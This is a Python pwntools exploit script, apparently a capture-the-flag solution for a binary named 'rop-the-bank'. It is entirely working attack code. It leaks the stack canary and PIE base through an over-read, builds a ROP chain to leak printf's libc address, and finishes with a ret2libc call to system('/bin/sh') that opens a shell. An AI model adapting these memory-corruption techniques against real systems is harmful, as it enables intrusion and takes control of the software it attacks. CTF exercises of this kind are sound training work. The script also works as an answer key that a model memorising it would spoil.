#!/usr/bin/env python3
from pwn import *

exe = ELF("./dist/rop-the-bank", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        return process(["./dist/rop-the-bank"])
    else:
        return remote("127.0.0.1", 1111)

def main():
    r = conn()

    # Login
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Username: ", b"hacker")
    r.sendlineafter(b"PIN: ", b"1337")

    # Leak Canary & PIE: 
    # Exploit the Over-read vulnerability in show_statement() 
    # where write() outputs 128 bytes from a 64-byte array to dump stack memory.
    
    r.sendlineafter(b"> ", b"2")
    r.recvuntil(b"[*] Account  : ")
    
    leak = r.recv(128)
    canary = u64(leak[72:80])
    saved_rbp = u64(leak[80:88])
    saved_rip = u64(leak[88:96])
    
    # Calc PIE base
    exe.address = saved_rip - 0x18b6
    
    log.success(f"Canary: {hex(canary)}")
    log.success(f"PIE: {hex(exe.address)}")
    log.success(f"saved_rbp: {hex(saved_rbp)}")

    # Leak Libc:
    # Exploit the buffer overflow vulnerability in deposit() to overwrite the return address.
    # We use a ROP chain to call puts(printf@GOT), which prints the actual memory address of printf in libc.
    
    r.sendlineafter(b"> ", b"3")
    
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    payload = b"A" * 72
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(exe.got['printf'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.address + 0x1448)

    payload_escaped = b"".join(bytes([0x16, b]) for b in payload)

    r.sendlineafter(b"Amount to deposit: ", payload_escaped)

    # Read leaked printf address
    r.recvline()
    leak_line = r.recvline().strip()
    printf_leak = u64(leak_line.ljust(8, b"\x00"))
    log.success(f"LEAKED printf@GLIBC: {hex(printf_leak)}")

    # At this step, the player will copy the address above to https://libc.rip/ and find the 3 offsets below:

    LIBC_OFFSET_PRINTF = 0x64080  
    LIBC_OFFSET_SYSTEM = 0x5c2e0 
    LIBC_OFFSET_BINSH  = 0x1db799 

    libc_base = printf_leak - LIBC_OFFSET_PRINTF
    log.success(f"Calculated Libc Base: {hex(libc_base)}")

    # Ret2libc -> Ret2shellcode
    ret = rop.find_gadget(['ret'])[0] 
    
    payload2 = b"A" * 72
    payload2 += p64(canary)
    payload2 += b"B" * 8
    payload2 += p64(pop_rdi)
    payload2 += p64(libc_base + LIBC_OFFSET_BINSH)
    payload2 += p64(libc_base + LIBC_OFFSET_SYSTEM)

    payload2_escaped = b"".join(bytes([0x16, b]) for b in payload2)
    r.sendafter(b"Amount to deposit: ", payload2_escaped + b"\n")

    log.success("Enjoy your shell!")
    r.interactive()

if __name__ == "__main__":
    main()